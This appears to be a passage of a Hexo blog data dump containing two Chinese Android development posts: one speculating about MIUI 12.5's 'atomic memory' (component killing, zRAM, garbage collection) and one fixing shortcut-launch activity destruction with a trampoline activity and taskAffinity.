title=\"精细压缩\"></a>精细压缩</h3><p>说到压缩，我们可以从最基本的一些解释中了解原理：</p>\n<blockquote>\n<p>它就是移除多余的空白字符，插入单个的重复字符指出一个字符串中重复的字符，以及将小型的位串用频繁使用的字符替代。</p>\n</blockquote>\n<p>压缩其实是一个很朴素的概念，当你知道下一秒的画面跟这一秒一致时，是不是可以少存储几帧数据。在内存上，也是类似的方法，它是真正能够节约物理空间的。</p>\n<p>在MIUI的海报中，有个非常关键的前提就是：<strong>根据场景</strong>。也就是说，并不是无脑地对所有内存占用进行压缩，而是根据用户使用的场景，<strong>来判断哪些进程或者组件所占用的内存可以压缩，哪些最好不要压缩</strong>，一切以用户体验为前提。这个压缩的策略，和上述的拆分内存类似，可能也会有机器学习的施展空间，当然，用黑白名单来进行简单粗暴的实现也不是不可以。</p>\n<p>精细压缩这一步，从Android系统的体系结构来讲，总体可以分为两方面，一是<strong>交换压缩</strong>，二是<strong>垃圾回收</strong>。</p>\n<h4 id=\"交换压缩\"><a href=\"#交换压缩\" class=\"headerlink\" title=\"交换压缩\"></a>交换压缩</h4><p>先看看官方介绍：</p>\n<p><img src=\"https://cdn.sspai.com/2021/08/15/7e080624c9036d6ece5b4c439ee02809.png\"></p>\n<blockquote>\n<p>Android 设备包含三种不同类型的内存：RAM、zRAM 和存储器。</p>\n<ul>\n<li><p>RAM 是最快的内存类型，但其大小通常有限。高端设备通常具有最大的 RAM 容量。</p>\n</li>\n<li><p>zRAM 是用于交换空间的 RAM 分区。所有数据在放入 zRAM 时都会进行压缩，然后在从 zRAM 向外复制时进行解压缩。这部分 RAM 会随着页面进出 zRAM 而增大或缩小。设备制造商可以设置 zRAM 大小上限。</p>\n</li>\n<li><p>存储器中包含所有持久性数据（例如文件系统等），以及为所有应用、库和平台添加的对象代码。存储器比另外两种内存的容量大得多。<strong>在 Android 上，存储器不像在其他 Linux 实现上那样用于交换空间（swap），因为频繁写入会导致这种内存出现损坏，并缩短存储媒介的使用寿命</strong>。</p>\n</li>\n</ul>\n</blockquote>\n<p>我们可以看出，zRAM是内存压缩的关键所在，相当于在内存上划分出一小块区域用于非活跃内存占用的压缩存储。这个“z”，大概就是zip的意思吧。所以，在内存压缩的底层实现上，原生Android已经搞定了，MIUI不需要自行实现这些内存管理机制，最多是<strong>在此基础上根据用户使用场景进行算法优化或者动态调整配置</strong>。</p>\n<p>这里特别要注意的是，官方文档提到：<strong>在 Android 上，存储器不像在其他 Linux 实现上那样用于交换空间</strong>。这一点也否认了最近网上关于MIUI原子内存的讨论中“就是Linux的swap机制而已”之类的看法。</p>\n<p>我个人认为，Linux的swap机制不会特别适用于移动设备，因为移动设备的存储器基本上都是类似SSD的闪存，用作交换空间来存取内存数据是非常减寿的，对手机来说，闪存寿命下降就意味着卡顿。即便是现在的电脑，也不会设置那么大的swap空间甚至不设置了，因为很多电脑内存本身就很大。</p>\n<h4 id=\"垃圾回收\"><a href=\"#垃圾回收\" class=\"headerlink\" title=\"垃圾回收\"></a>垃圾回收</h4><p>我们每一个应用都运行在一个独立的Android虚拟机之上，所以应用的每一个进程也可叫做虚拟机进程。Android虚拟机可以粗浅地看作Java虚拟机（JVM）的魔改版本，它不能运行原生Java程序。<strong>垃圾回收（GC）是JVM内存管理的核心机制之一</strong>。这里就不赘述了，简单来说就是系统对内存单元的整理和清除。</p>\n<p>垃圾回收和刚才的交换压缩一样，它们管理内存的粒度都是“内存页（page）”，而不是进程和Android组件了，对于上层的应用来说，是没有什么感知的，系统底层在默默地自我调节。</p>\n<p>MIUI原子内存在垃圾回收层面应该不会去做什么改动，因为GC机制比较底层，而且也相对成熟稳定，MIUI做的事情更多是用户层面的，业务层面的，属于GC的上层调用者。</p>\n<p><strong>精细压缩可能会在何时触发、如何更有效地触发垃圾回收上面下功夫</strong>。</p>\n<h2 id=\"后话\"><a href=\"#后话\" class=\"headerlink\" title=\"后话\"></a>后话</h2><p>做了这么多猜测，其实也没有特别深入的技术细节讨论，但我在查阅研究过程中，还是能感受到MIUI在系统层面的努力，而不仅仅限于做“UI”。毕竟这么花里胡哨的功能命名都唱出来了，怎么也得有点干货才行吧。</p>\n<p>此外，写完了我才想到忘了提及以前的Android玩机工具写轮眼，它的主要功能就是由用户自行决定销毁哪些组件，MIUI原子内存或许也从中借鉴了一些思路。</p>\n<p>还有一点收获就是，现在我们可以在很多移动设备用户场景遇到AI技术的落地或者是落地的可能性，借此机会，有空的话可以再跟大家聊聊<strong>端侧AI</strong>。</p>\n<p>13号当晚我也顺利升级到了这个MIUI 12.5增强版，感受了一下，同时开10个常用App，后台被杀的情况确实有所改善，而且剩余内存也比以前多了。对普通用户来说这就是简单真实的感受，有效果，说明有点东西。</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><a href=\"https://developer.android.com/guide/components/activities/process-lifecycle?hl=zh-cn\">进程和应用生命周期 | Android Developers</a></li>\n<li><a href=\"https://developer.android.com/topic/performance/memory-management?hl=zh-cn#low-memory_killer\">进程间的内存分配 | Android Developers</a></li>\n<li><a href=\"https://www.zhihu.com/question/478811156\">如何评价 8 月 10 日小米正式推出的 MIUI 12.5 增强版？</a></li>\n<li><a href=\"https://v2ex.com/t/795335\">MIUI 最近那个原子内存是什么原理？ - V2EX</a></li>\n</ul>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>比起最近雷布斯的个人演讲，其实我更好奇MIUI 12.5增强版（超级Bug-list修复版）推出的那四个性能优化项目：</p>\n<ul>\n<li><p>焦点计算 - 处理器智能调度机制</p>\n</li>\n<li><p>原子内存 - 精细化内存管理机制</p>\n</li>\n<li><p>液态存储 - 文件存储管理机制</p>\n</li>\n<li><p>智能均衡 - 对旗舰硬件性能的智能调配</p>\n</li>\n</ul>\n<p>作为技术爱好者，这个“原子内存”还真是提起了我的兴趣，因为其他三项还算比较好理解。毕竟内存管理这件事，是操作系统领域几乎永恒的课题。</p>\n<h2 id=\"官方解释\"><a href=\"#官方解释\" class=\"headerlink\" title=\"官方解释\"></a>官方解释</h2><p>我们先来了解下<a href=\"https://home.miui.com/\">MIUI官方网站</a>是如何介绍原子内存的。官网的海报动效还是阐释得比较清晰明了（辛苦设计师小姐姐，不知道又加了多少班）。</p>\n<p>最开始是几个独立的应用各自占有一定的内存，看看这绿，这不就是微信绿。看看这蓝，支付宝？看看这橙，这啥，淘宝吧估计是，肯定不是小米自己。设计姐姐在疯狂暗示。</p>\n<p><img src=\"https://cdn.sspai.com/2021/08/15/9589aa58ccd69abe73eebd4d9803a07d.png\"></p>\n<p>然后，第二步是<strong>拆分应用内存，结束不重要的任务</strong>，刚才还是整块的内存占用现在在逻辑上被划分为了大小不等（即不同功能占用内存大小不同）的几块。这一步其实就是核心了，如何来划分呢？按什么维度划分呢？有没有可能划分失误反而影响用户体验呢？我们后面来聊。</p>\n<p><img src=\"https://cdn.sspai.com/2021/08/15/ae6c6945876364518dbc8eec036e2d2b.png\"></p>\n<p>第三步，<strong>根据场景，进一步精细压缩</strong>。这一步也很关键，不仅能结束优先级较低的任务，还能对剩余的任务进行内存占用的压缩。听起来有点玄乎，其实问题还是和第二步类似，如何对内存进行压缩？系统如何知道要压缩哪些内容呢？</p>\n<p><img src=\"https://cdn.sspai.com/2021/08/15/b3de9b85cae94e7848d445c5fd23b69e.png\"></p>\n<p>带着上面这些问题，我们来简单聊一聊MIUI可能会如何实现这个原子内存，也即是说，以下内容均是基于个人经验提出的一些猜想，描述尽可能不那么硬核。</p>\n<h2 id=\"原理猜想\"><a href=\"#原理猜想\" class=\"headerlink\" title=\"原理猜想\"></a>原理猜想</h2><p>我们知道，现代操作系统基本都有进程（process）和线程（thread）的概念，用书本上的话说就是：</p>\n<blockquote>\n<p>进程是资源分配的最小单位，线程是CPU调度的最小单位。</p>\n</blockquote>\n<p>那么二者的关系，简单概括便是：一个运行中的应用程序就可以包含多个进程，一个进程又可以包含多个线程。</p>\n<p><em>拿微信举例来说，主功能聊天是一个进程，内置浏览器又是另一个进程，进程之间可以进行通信，但又可以互不影响，比如浏览器崩溃了，不影响你聊天，这也是多进程的好处之一。然后，在聊天进程内部，你下载表情包时会开启另一个线程来完成任务，而不会影响你的UI渲染线程，保证了交互的流畅性，这就是多线程的好处。</em></p>\n<p>大致了解这些基本概念后，我们就可以继续思考MIUI的原子内存了。</p>\n<p>Android系统基于Linux，当然也有进程的概念。我们平时俗称的“杀进程”，一般就是指在最近任务中划掉相应的应用来终止其运行，在你划掉的那一瞬间，系统会杀掉此应用相关联的所有进程。而我们俗称的“被杀后台”，就是应用在置于后台且不可见的时候，被系统为了节约内存等资源而杀掉，这对用户而言是一种被动的杀进程，某种程度上比较影响使用体验。</p>\n<p><img src=\"https://cdn.sspai.com/2021/08/15/a32183b73145700eb82299cfd47ef07a.png\"></p>\n<p>在Android的<a href=\"https://developer.android.com/topic/performance/memory-management?hl=zh-cn\">官方文档</a>中关于内存分配有这么一段话：</p>\n<blockquote>\n<p>Android 平台在运行时不会浪费可用的内存。它会一直尝试利用所有可用内存。例如，系统会在应用关闭后将其保留在内存中，以便用户快速切回到这些应用。因此，通常情况下，Android 设备在运行时几乎没有可用的内存。要在重要系统进程和许多用户应用之间正确分配内存，内存管理至关重要。</p>\n</blockquote>\n<p>其实这个解释和Apple官方之前建议用户不要频繁地手动杀进程是一个道理。因为应用启动，<strong>进程重新创建的开销是很大的</strong>。此外，接触过Android开发的同学都知道，系统在内存不足的时候也会尽可能地通知各应用，给了你“体面”处理自己的机会。</p>\n<p>然而，很多时候国产手机厂商也是不得已而为之，因Android应用可以在后台运行的特性，不管是各类巨无霸应用，还是小而美应用，都在努力让自己在后台保活而不遵守开发规范，生怕用户离它们而去。但这样争奇斗艳的后果就是用户设备续航能力急剧下降，挨骂的往往就是手机系统厂商了。</p>\n<p>“原子内存”想解决的便是这个问题，既能让更多的应用不被系统<strong>完全</strong>杀掉，也能减少系统资源的占用，在功耗和功能之间取得一个相对平衡。</p>\n<h3 id=\"拆分内存\"><a href=\"#拆分内存\" class=\"headerlink\" title=\"拆分内存\"></a>拆分内存</h3><p>其实在Android应用层面的开发当中，中小型应用的开发者日常很少会接触到进程的概念，更多的是Android自己抽象的一套开发框架。在其设计架构中，谷歌给开发者和用户提供了“四大组件”：</p>\n<ul>\n<li><p>Activity - 可简单理解成我们打开的每一个活动页面，用于处理用户交互的逻辑</p>\n</li>\n<li><p>Service - 服务，和Activity的逻辑结构类似，只不过没有界面，比如用于播放音乐、下载文件等</p>\n</li>\n<li><p>BroadcastReceiver - 可理解为，Android系统就是一个巨大的世界频道，每个应用都可以用小喇叭广播消息，当然也需要接收消息</p>\n</li>\n<li><p>ContentProvider - 数据存储和提供的组件，内含标准接口，不同应用之间可通过此来共享内容</p>\n</li>\n</ul>\n<p>感兴趣的同学可以去安装一个叫<strong>LibChecker</strong>的应用，可以查看已安装应用都有哪些以上组件，往往一个应用会包含很多个各种各样的组件，并常以功能的维度来划分。</p>\n<p>这些组件是Android开发的基础，对于任意一个组件，它都可以独占一个进程（比如我们上面提到的内置浏览器WebView），也可以和其他组件共享同一个进程，大多数情况都是后者。组件的本质也就是系统创建的一个内存对象，同时，每个组件都有自己的生命周期，在应用进程不被杀掉之前，可以提前结束（比如你打开登录页面完成登录，这个Activity的使命就完成了，可以被系统回收资源）。</p>\n<p><img src=\"https://cdn.sspai.com/2021/08/15/35dab82b6279a0d7c3175e2c2b77aaa1.png\"></p>\n<p>所以在我第一时间看到MIUI原子内存的宣传时，就想到了对四大组件的精细化查杀。拆分内存这一行为可能实质上就是<strong>把应用内的各个组件进行分类并按优先级排序</strong>，销毁低优先级的组件，保证用户可见和正在使用的组件活着就行了，如此就能节省很多内存。当用户需要再次使用某组件时，重新创建启动便是。</p>\n<p><em>又拿微信来举例，当你扫码支付后，又回到聊天界面，聊了几句再把微信置于后台，这时候你去干别的事情了，系统是不是可以把刚才支付相关的资源都回收掉呢？</em></p>\n<p>当然，如果销毁和创建的行为过于频繁，也会消耗不少的系统资源，所以我猜测除了设计组件优先级等基本策略，还会有一些机器学习的玩法在里面，<strong>更精准地识别哪些可以被销毁</strong>。在用户使用过程中体验会越来越好，这是一个双向正反馈的过程。</p>\n<p>最近在MIUI的官方论坛也看到一些解释提到“进程级”查杀，其实这个就更好理解了，因为本身很多业务相关性强的组件就在同一个进程内，一个大型应用往往有很多进程在同时运行，那么系统也可以杀掉某些暂时用不到的进程（相当于还能一次性销毁多个组件），而非粗暴地杀掉整个应用导致用户回来时一切都要重来。</p>\n<h3 id=\"精细压缩\"><a href=\"#精细压缩\" class=\"headerlink\" title=\"精细压缩\"></a>精细压缩</h3><p>说到压缩，我们可以从最基本的一些解释中了解原理：</p>\n<blockquote>\n<p>它就是移除多余的空白字符，插入单个的重复字符指出一个字符串中重复的字符，以及将小型的位串用频繁使用的字符替代。</p>\n</blockquote>\n<p>压缩其实是一个很朴素的概念，当你知道下一秒的画面跟这一秒一致时，是不是可以少存储几帧数据。在内存上，也是类似的方法，它是真正能够节约物理空间的。</p>\n<p>在MIUI的海报中，有个非常关键的前提就是：<strong>根据场景</strong>。也就是说，并不是无脑地对所有内存占用进行压缩，而是根据用户使用的场景，<strong>来判断哪些进程或者组件所占用的内存可以压缩，哪些最好不要压缩</strong>，一切以用户体验为前提。这个压缩的策略，和上述的拆分内存类似，可能也会有机器学习的施展空间，当然，用黑白名单来进行简单粗暴的实现也不是不可以。</p>\n<p>精细压缩这一步，从Android系统的体系结构来讲，总体可以分为两方面，一是<strong>交换压缩</strong>，二是<strong>垃圾回收</strong>。</p>\n<h4 id=\"交换压缩\"><a href=\"#交换压缩\" class=\"headerlink\" title=\"交换压缩\"></a>交换压缩</h4><p>先看看官方介绍：</p>\n<p><img src=\"https://cdn.sspai.com/2021/08/15/7e080624c9036d6ece5b4c439ee02809.png\"></p>\n<blockquote>\n<p>Android 设备包含三种不同类型的内存：RAM、zRAM 和存储器。</p>\n<ul>\n<li><p>RAM 是最快的内存类型，但其大小通常有限。高端设备通常具有最大的 RAM 容量。</p>\n</li>\n<li><p>zRAM 是用于交换空间的 RAM 分区。所有数据在放入 zRAM 时都会进行压缩，然后在从 zRAM 向外复制时进行解压缩。这部分 RAM 会随着页面进出 zRAM 而增大或缩小。设备制造商可以设置 zRAM 大小上限。</p>\n</li>\n<li><p>存储器中包含所有持久性数据（例如文件系统等），以及为所有应用、库和平台添加的对象代码。存储器比另外两种内存的容量大得多。<strong>在 Android 上，存储器不像在其他 Linux 实现上那样用于交换空间（swap），因为频繁写入会导致这种内存出现损坏，并缩短存储媒介的使用寿命</strong>。</p>\n</li>\n</ul>\n</blockquote>\n<p>我们可以看出，zRAM是内存压缩的关键所在，相当于在内存上划分出一小块区域用于非活跃内存占用的压缩存储。这个“z”，大概就是zip的意思吧。所以，在内存压缩的底层实现上，原生Android已经搞定了，MIUI不需要自行实现这些内存管理机制，最多是<strong>在此基础上根据用户使用场景进行算法优化或者动态调整配置</strong>。</p>\n<p>这里特别要注意的是，官方文档提到：<strong>在 Android 上，存储器不像在其他 Linux 实现上那样用于交换空间</strong>。这一点也否认了最近网上关于MIUI原子内存的讨论中“就是Linux的swap机制而已”之类的看法。</p>\n<p>我个人认为，Linux的swap机制不会特别适用于移动设备，因为移动设备的存储器基本上都是类似SSD的闪存，用作交换空间来存取内存数据是非常减寿的，对手机来说，闪存寿命下降就意味着卡顿。即便是现在的电脑，也不会设置那么大的swap空间甚至不设置了，因为很多电脑内存本身就很大。</p>\n<h4 id=\"垃圾回收\"><a href=\"#垃圾回收\" class=\"headerlink\" title=\"垃圾回收\"></a>垃圾回收</h4><p>我们每一个应用都运行在一个独立的Android虚拟机之上，所以应用的每一个进程也可叫做虚拟机进程。Android虚拟机可以粗浅地看作Java虚拟机（JVM）的魔改版本，它不能运行原生Java程序。<strong>垃圾回收（GC）是JVM内存管理的核心机制之一</strong>。这里就不赘述了，简单来说就是系统对内存单元的整理和清除。</p>\n<p>垃圾回收和刚才的交换压缩一样，它们管理内存的粒度都是“内存页（page）”，而不是进程和Android组件了，对于上层的应用来说，是没有什么感知的，系统底层在默默地自我调节。</p>\n<p>MIUI原子内存在垃圾回收层面应该不会去做什么改动，因为GC机制比较底层，而且也相对成熟稳定，MIUI做的事情更多是用户层面的，业务层面的，属于GC的上层调用者。</p>\n<p><strong>精细压缩可能会在何时触发、如何更有效地触发垃圾回收上面下功夫</strong>。</p>\n<h2 id=\"后话\"><a href=\"#后话\" class=\"headerlink\" title=\"后话\"></a>后话</h2><p>做了这么多猜测，其实也没有特别深入的技术细节讨论，但我在查阅研究过程中，还是能感受到MIUI在系统层面的努力，而不仅仅限于做“UI”。毕竟这么花里胡哨的功能命名都唱出来了，怎么也得有点干货才行吧。</p>\n<p>此外，写完了我才想到忘了提及以前的Android玩机工具写轮眼，它的主要功能就是由用户自行决定销毁哪些组件，MIUI原子内存或许也从中借鉴了一些思路。</p>\n<p>还有一点收获就是，现在我们可以在很多移动设备用户场景遇到AI技术的落地或者是落地的可能性，借此机会，有空的话可以再跟大家聊聊<strong>端侧AI</strong>。</p>\n<p>13号当晚我也顺利升级到了这个MIUI 12.5增强版，感受了一下，同时开10个常用App，后台被杀的情况确实有所改善，而且剩余内存也比以前多了。对普通用户来说这就是简单真实的感受，有效果，说明有点东西。</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><a href=\"https://developer.android.com/guide/components/activities/process-lifecycle?hl=zh-cn\">进程和应用生命周期 | Android Developers</a></li>\n<li><a href=\"https://developer.android.com/topic/performance/memory-management?hl=zh-cn#low-memory_killer\">进程间的内存分配 | Android Developers</a></li>\n<li><a href=\"https://www.zhihu.com/question/478811156\">如何评价 8 月 10 日小米正式推出的 MIUI 12.5 增强版？</a></li>\n<li><a href=\"https://v2ex.com/t/795335\">MIUI 最近那个原子内存是什么原理？ - V2EX</a></li>\n</ul>\n"},{"layout":"post","title":"Android Shortcut启动导致其他Activity销毁问题","subtitle":"小问题而已。","date":"2021-09-26T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n### 问题\n\n我们都知道，从API 25开始，Android加入了类似3D Touch一样的功能，即长按桌面图标可以弹出快捷方式菜单（最多4个）。早期国产系统的桌面Launcher并没有积极适这一功能，所以各大应用也懒得做，后来才逐渐完善。目前包括微信、支付宝等都可以长按弹出快捷方式，支付宝更是支持动态配置。\n\n![image-20210927162251836](https://imgconvert.csdnimg.cn/d7aa4036340c49a2a7915fda33299299.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_18,color_FFFFFF,t_70,g_se,x_16)\n\n开发文档直接看官方的就行：[https://developer.android.com/guide/topics/ui/shortcuts](https://developer.android.com/guide/topics/ui/shortcuts?hl=zh-cn) ，静态快捷方式适配很简单，加xml文件就完事，此处不赘述。\n\n但在实际体验开发过程中发现，通过快捷方式打开应用的对应页面后，其他Activity会被销毁。这并不是我们想要的效果。\n\n### 简单分析\n\n这个现象很像是在启动Activity时设置了 **CLEAR_TASK** 的标识，导致任务栈被清空。但是，从下列的使用示例来看，静态快捷方式又无法设置Intent的flag，相关逻辑由系统SDK内部实现。\n\n```xml\n<shortcuts xmlns:android=\"http://schemas.android.com/apk/res/android\">\n  <shortcut\n    android:shortcutId=\"compose\"\n    android:enabled=\"true\"\n    android:icon=\"@drawable/compose_icon\"\n    android:shortcutShortLabel=\"@string/compose_shortcut_short_label1\"\n    android:shortcutLongLabel=\"@string/compose_shortcut_long_label1\"\n    android:shortcutDisabledMessage=\"@string/compose_disabled_message1\">\n    <!-- 例1 -->\n    <intent\n      android:action=\"android.intent.action.VIEW\"\n      android:targetPackage=\"com.example.myapplication\"\n      android:targetClass=\"com.example.myapplication.ComposeActivity\" />\n    <!-- 例2 -->\n    <intent\n      android:action=\"android.intent.action.VIEW\"\n      android:data=\"xxx://xxx/xxx\" />\n  </shortcut>\n  <!-- Specify more shortcuts here. -->\n</shortcuts>\n```\n\n后来，我在官方文档看到这么一段：\n\n> 静态快捷方式不能有自定义 intent 标记。 静态快捷方式的第一个 intent 始终设置有 Intent.FLAG_ACTIVITY_NEW_TASK 和 Intent.FLAG_ACTIVITY_CLEAR_TASK。这意味着，如果应用已在运行，则在静态快捷方式启动时，应用中的所有现有 Activity 都会被销毁。如果不希望出现这种行为，您可以使用 Trampoline Activity ……\n\n### 解决\n\n这个Trampoline意思就是设置一个跳板Activity，来分发启动目标Activity，并且我们需要让这个跳板Activity和应用的其他Activity不在一个栈中，很简单，设置 `taskAffinity` 属性即可：\n\n```xml\n<!-- AndroidManifest.xml -->\n<activity\n  android:name=\".TrampolineActivity\"\n  android:taskAffinity=\"\" />\n  \n<!-- xml/shortcuts.xml -->\n<intent\n  android:action=\"android.intent.action.VIEW\"\n  android:targetPackage=\"com.example.myapplication\"\n  android:targetClass=\"com.example.myapplication.TrampolineActivity\" />\n```\n\n不显示设置taskAffinity，其默认值为包名，所以只要给我们的跳板Activity设置非包名的字符串就行。如此，再通过桌面长按快捷方式打开应用时，就不会销毁其他页面了。\n","source":"_posts/2021-09-27-Android Shortcut启动导致其他Activity销毁问题.md","raw":"---\nlayout:     post\ntitle:      Android Shortcut启动导致其他Activity销毁问题\nsubtitle:   小问题而已。\ndate:       2021-09-27\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n---\n\n### 问题\n\n我们都知道，从API 25开始，Android加入了类似3D Touch一样的功能，即长按桌面图标可以弹出快捷方式菜单（最多4个）。早期国产系统的桌面Launcher并没有积极适这一功能，所以各大应用也懒得做，后来才逐渐完善。目前包括微信、支付宝等都可以长按弹出快捷方式，支付宝更是支持动态配置。\n\n![image-20210927162251836](https://imgconvert.csdnimg.cn/d7aa4036340c49a2a7915fda33299299.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_18,color_FFFFFF,t_70,g_se,x_16)\n\n开发文档直接看官方的就行：[https://developer.android.com/guide/topics/ui/shortcuts](https://developer.android.com/guide/topics/ui/shortcuts?hl=zh-cn) ，静态快捷方式适配很简单，加xml文件就完事，此处不赘述。\n\n但在实际体验开发过程中发现，通过快捷方式打开应用的对应页面后，其他Activity会被销毁。这并不是我们想要的效果。\n\n### 简单分析\n\n这个现象很像是在启动Activity时设置了 **CLEAR_TASK** 的标识，导致任务栈被清空。但是，从下列的使用示例来看，静态快捷方式又无法设置Intent的flag，相关逻辑由系统SDK内部实现。\n\n```xml\n<shortcuts xmlns:android=\"http://schemas.android.com/apk/res/android\">\n  <shortcut\n    android:shortcutId=\"compose\"\n    android:enabled=\"true\"\n    android:icon=\"@drawable/compose_icon\"\n    android:shortcutShortLabel=\"@string/compose_shortcut_short_label1\"\n    android:shortcutLongLabel=\"@string/compose_shortcut_long_label1\"\n    android:shortcutDisabledMessage=\"@string/compose_disabled_message1\">\n    <!-- 例1 -->\n    <intent\n      android:action=\"android.intent.action.VIEW\"\n      android:targetPackage=\"com.example.myapplication\"\n      android:targetClass=\"com.example.myapplication.ComposeActivity\" />\n    <!-- 例2 -->\n    <intent\n      android:action=\"android.intent.action.VIEW\"\n      android:data=\"xxx://xxx/xxx\" />\n  </shortcut>\n  <!-- Specify more shortcuts here. -->\n</shortcuts>\n```\n\n后来，我在官方文档看到这么一段：\n\n> 静态快捷方式不能有自定义 intent 标记。 静态快捷方式的第一个 intent 始终设置有 Intent.FLAG_ACTIVITY_NEW_TASK 和 Intent.FLAG_ACTIVITY_CLEAR_TASK。这意味着，如果应用已在运行，则在静态快捷方式启动时，应用中的所有现有 Activity 都会被销毁。如果不希望出现这种行为，您可以使用 Trampoline Activity ……\n\n### 解决\n\n这个Trampoline意思就是设置一个跳板Activity，来分发启动目标Activity，并且我们需要让这个跳板Activity和应用的其他Activity不在一个栈中，很简单，设置 `taskAffinity` 属性即可：\n\n```xml\n<!-- AndroidManifest.xml -->\n<activity\n  android:name=\".TrampolineActivity\"\n  android:taskAffinity=\"\" />\n  \n<!-- xml/shortcuts.xml -->\n<intent\n  android:action=\"android.intent.action.VIEW\"\n  android:targetPackage=\"com.example.myapplication\"\n  android:targetClass=\"com.example.myapplication.TrampolineActivity\" />\n```\n\n不显示设置taskAffinity，其默认值为包名，所以只要给我们的跳板Activity设置非包名的字符串就行。如此，再通过桌面长按快捷方式打开应用时，就不会销毁其他页面了。\n","slug":"Android Shortcut启动导致其他Activity销毁问题","published":1,"updated":"2024-03-25T07:31:25.985Z","comments":1,"photos":[],"link":"","_id":"cluaufh1f0047the603od8hju","content":"<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>我们都知道，从API 25开始，Android加入了类似3D Touch一样的功能，即长按桌面图标可以弹出快捷方式菜单（最多4个）。早期国产系统的桌面Launcher并没有积极适这一功能，所以各大应用也懒得做，后来才逐渐完善。目前包括微信、支付宝等都可以长按弹出快捷方式，支付宝更是支持动态配置。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/d7aa4036340c49a2a7915fda33299299.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_18,color_FFFFFF,t_70,g_se,x_16\" alt=\"image-20210927162251836\"></p>\n<p>开发文档直接看官方的就行：<a href=\"https://developer.android.com/guide/topics/ui/shortcuts?hl=zh-cn\">https://developer.android.com/guide/topics/ui/shortcuts</a> ，静态快捷方式适配很简单，加xml文件就完事，此处不赘述。</p>\n<p>但在实际体验开发过程中发现，通过快捷方式打开应用的对应页面后，其他Activity会被销毁。这并不是我们想要的效果。</p>\n<h3 id=\"简单分析\"><a href=\"#简单分析\" class=\"headerlink\" title=\"简单分析\"></a>简单分析</h3><p>这个现象很像是在启动Activity时设置了 <strong>CLEAR_TASK</strong> 的标识，导致任务栈被清空。但是，从下列的使用示例来看，静态快捷方式又无法设置Intent的flag，相关逻辑由系统SDK内部实现。</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">shortcuts</span> <span class=\"attr\">xmlns:android</span>=<span class=\"string\">&quot;http://schemas.android.com/apk/res/android&quot;</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">shortcut</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:shortcutId</span>=<span class=\"string\">&quot;compose&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:enabled</span>=<span class=\"string\">&quot;true&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:icon</span>=<span class=\"string\">&quot;@drawable/compose_icon&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:shortcutShortLabel</span>=<span class=\"string\">&quot;@string/compose_shortcut_short_label1&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:shortcutLongLabel</span>=<span class=\"string\">&quot;@string/compose_shortcut_long_label1&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:shortcutDisabledMessage</span>=<span class=\"string\">&quot;@string/compose_disabled_message1&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- 例1 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">intent</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">android:action</span>=<span class=\"string\">&quot;android.intent.action.VIEW&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">android:targetPackage</span>=<span class=\"string\">&quot;com.example.myapplication&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">android:targetClass</span>=<span class=\"string\">&quot;com.example.myapplication.ComposeActivity&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- 例2 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">intent</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">android:action</span>=<span class=\"string\">&quot;android.intent.action.VIEW&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">android:data</span>=<span class=\"string\">&quot;xxx://xxx/xxx&quot;</span> 